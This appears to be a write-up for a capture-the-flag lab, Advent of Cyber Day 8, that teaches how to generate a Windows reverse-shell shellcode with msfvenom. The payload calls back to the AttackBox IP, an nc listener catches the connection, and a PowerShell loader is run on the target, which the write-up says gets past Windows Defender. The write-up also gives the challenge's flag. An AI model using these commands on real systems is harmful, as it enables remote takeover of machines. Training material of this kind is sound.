# Day 8: Shellcodes of the world, unite!

**Learning Objectives**
- Grasp the fundamentals of writing shellcode
- Generate shellcode for reverse shells
- Executing shellcode with PowerShell

### Generating Shellcode
Let's learn how to generate a shellcode to see what it looks like. To do this, we will use a tool called `msfvenom` to get a reverse shell.  

In the **AttackBox**, open the terminal and enter the command `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKBOX_IP LPORT=1111 -f powershell` that will generate the shellcode. Replace the `ATTACKBOX_IP` with the IP of the AttackBox (mine: **10.10.123.115**):
![image](https://github.com/user-attachments/assets/efcef4c5-f2eb-40a0-9032-d6474be9445a)

The command (`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKBOX_IP LPORT=1111 -f powershell`) generates a piece of shellcode using `msfvenom`. Here's what each part means:

- `-p windows/x64/shell_reverse_tcp`: The `-p` flag tells `msfvenom` what type of payload to create. `windows/x64/shell_reverse_tcp` specifies that we want a reverse shell for a Windows machine.
- `LHOST=ATTACKBOX_IP`: This is the IP address of the AttackBox. It tells the reverse shell where to connect back to.
- `LPORT=1111`: This is the port number on your machine that will listen for the reverse shell connection. When the target connects back to you, it will use this port (`1111` in this example). You can choose any available port, but it needs to match with what your listener is set to.
- `-f powershell`: This specifies the format for the output. In this case, we want the payload to be in PowerShell format so it can be executed as a script on a Windows machine.

### Time for Some Action - Executing the Shellcode

1. On the **AttackBox**, execute the command `nc -nvlp 1111` to start a listener on port 1111 and wait for an incoming connection. This command opens port 1111 and listens for connections, allowing the AttackBox to receive data once a connection is made.

2. On the **AttackBox**, begin by navigating to the Desktop. Right-click on the Desktop, select Create Document, and then choose Empty File. Open this new file and paste the previously provided PowerShell script code (on [THM](https://tryhackme.com/r/room/adventofcyber2024)) into it.

3. Look for the part labelled `SHELLCODE_PLACEHOLDER` and replace it with the shellcode we previously created with `msfvenom`.

4. Once you've added the shellcode navigate to the attached **VM**, open PowerShell by clicking the PowerShell icon on the taskbar and piece by piece, paste the code from the document you recently created to the Windows PowerShell window.

5. Once you've finished copy-pasting, press Enter.
![image](https://github.com/user-attachments/assets/5c3e434c-307d-45b6-9bbc-dd58e3b844b9)

>[!note]
>If your PowerShell terminal unexpectedly closes, it means your `nc` listener was not reachable, possibly because it was not running or was listening on the wrong port or IP.

6. Once you execute the final line in the PowerShell terminal and press Enter, you will get a reverse shell in the AttackBox, giving you complete access to the computer even if the Windows Defender is enabled.
![image](https://github.com/user-attachments/assets/216eb1f0-860f-4424-aa66-5c75d7e798fe)

7. Now you can issue any command, like issuing `dir`, which will list all the directories.
![image](https://github.com/user-attachments/assets/5d3eced2-9fb4-4754-9818-f6a13659b00f)

### Regaining Access
Let's dive into the story and troubleshoot the issue in this part of the task. Glitch has realised he's no longer receiving incoming connections from his home base. Mayor Malware's minion team seems to have tampered with the shellcode and updated both the IP and port, preventing Glitch from connecting. The correct IP address for Glitch is **10.10.123.115** (AttackBox IP), and the successful connection port should be **4444**.

Can you help Glitch identify and update the shellcode with the correct IP and port to restore the connection and reclaim control?

1. In the **AttackBox** terminal type: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.123.115 LPORT=4444 -f powershell`.
2. Press Enter. This will create a new shellcode.
3. In the **AttackBox**, execute the command `nc -nvlp 4444` to start a listener on port 4444.
4. In a new document copy and paste the PowerShell script on THM, putting the newly created shellcode in.
5. Copy and paste document text into the **VM** PowerShell.
6. Return to AttackBox terminal: we have remote access.
![image](https://github.com/user-attachments/assets/fde7bbb1-7133-47d0-baea-18a7cfebae2c)

### Answers
1. What is the flag value once Glitch gets reverse shell on the digital vault using port 4444? Note: The flag may take around a minute to appear in the **C:\Users\glitch\Desktop** directory. You can view the content of the flag by using the command `type C:\Users\glitch\Desktop\flag.txt` in the AttackBox terminal. **AOC{GOT MY_ACCESS_B@CK007}**.
